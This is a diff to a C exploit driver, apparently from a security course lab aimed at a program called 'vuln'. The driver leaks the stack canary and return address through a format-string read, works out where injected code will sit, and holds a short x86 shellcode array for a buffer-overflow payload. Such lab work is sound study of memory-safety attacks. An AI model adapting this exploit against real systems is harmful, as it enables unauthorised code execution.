@@ -116,8 +116,6 @@ void create_subproc(const char* exec, char* argv[]) {
 #define STRINGIFY(X) STRINGIFY2(X)
 
 int main(int argc, char* argv[]) {
-   unsigned seed;
-
    char *nargv[3];
    nargv[0] = "vuln";
    nargv[1] = STRINGIFY(GRP);
@@ -131,19 +129,17 @@ int main(int argc, char* argv[]) {
    getchar();
 
    // Values obtained from the run #1
-   void *auth_user = 0xbfffe6f0;   // value of user variable in auth
-   void *auth_canary_loc = 0xbfffe88c; // location where auth's canary is stored
-   void *auth_bp_loc = 0xbfffe898; // location of auth's saved bp
-   void *auth_ra_loc = 0xbfffe89c; // location of auth's return address
+   void *auth_user       = (void*) 0xbfffe6f0;   // value of user variable in auth
+   void *auth_canary_loc = (void*) 0xbfffe88c; // location where auth's canary is stored
+   void *auth_ra_loc     = (void*) 0xbfffe89c; // location of auth's return address
 
    // Values obtained from the run #2
-   void *main_loop2_ebp = 0xbfffefd8; // value of main_loop's ebp from run #2
-   void *auth_user2 = 0xbfffe700; // value of user variable in auth from run #2
-   void *auth_user2_loc = 0xbfffe894; // user variable location from run #2
-   void *auth_pass2_loc = 0xbfffe888; // pass variable location from run #2
-   void *auth_l2_loc = 0xbfffe898; // l variable location from run #2
-   void *auth_ebp2 = 0xbfffe8a8; // value of auth's ebp from run #2
-
+   void *main_loop2_ebp  = (void*) 0xbfffefd8; // value of main_loop's ebp from run #2
+   void *auth_user2      = (void*) 0xbfffe700; // value of user variable in auth from run #2
+   void *auth_user2_loc  = (void*) 0xbfffe894; // user variable location from run #2
+   void *auth_pass2_loc  = (void*) 0xbfffe888; // pass variable location from run #2
+   void *auth_l2_loc     = (void*) 0xbfffe898; // l variable location from run #2
+   void *auth_ebp2       = (void*) 0xbfffe8a8; // value of auth's ebp from run #2
 
    unsigned int auth_user_auth_ra_loc_diff = auth_ra_loc - auth_user;
    unsigned int auth_user_auth_canary_loc_diff = auth_canary_loc - auth_user;
@@ -154,8 +150,6 @@ int main(int argc, char* argv[]) {
 
    // this is the offset where the address of jmp to will happen
    unsigned int offset_auth_user_main_loop_bp = main_loop2_ebp - auth_user2;
-   fprintf(stderr, "driver: Expected offset of auth_user from main_loop's ebp: %d\n", offset_auth_user_main_loop_bp);
-
    unsigned int offset_auth_ebp = auth_ebp2 - auth_user2;
 
    /*
@@ -173,16 +167,19 @@ int main(int argc, char* argv[]) {
 
    void *main_loop_ra, *main_loop_bp, *canary; // address of main_loop's return address
    get_formatted("%x%x%x", &canary, &main_loop_bp, &main_loop_ra); 
-   fprintf(stderr, "driver: Extracted canary: %x temp ebp: %x main_loop_ra: %x\n", canary, main_loop_bp, main_loop_ra);
+   fprintf(stderr, "driver: Extracted canary: %x temp ebp: %x main_loop_ra: %x\n", 
+      (unsigned int) canary, 
+      (unsigned int) main_loop_bp, 
+      (unsigned int) main_loop_ra);
 
    // 2. Find the address of where the injected code will be located
    //    This is necessary to return to this code.
    void *code_loc = main_loop_bp - offset_auth_user_main_loop_bp ;
-   fprintf(stderr, "driver: code_loc: 0x%x\n", code_loc);
+   fprintf(stderr, "driver: code_loc: 0x%x\n", (unsigned int) code_loc);
 
    // 3. Exploit
    // 3-1. Generate asm code
-   char *code[] = { 0x89, 0xE8, 0x2D, 0x75, 0x04, 0x00, 0x00, 0xFF, 0xE0, 0x90 }; 
+   char code[] = { 0x89, 0xE8, 0x2D, 0x75, 0x04, 0x00, 0x00, 0xFF, 0xE0, 0x90 }; 
    size_t len = 9;
    
    // 3-2. Prepare the payload
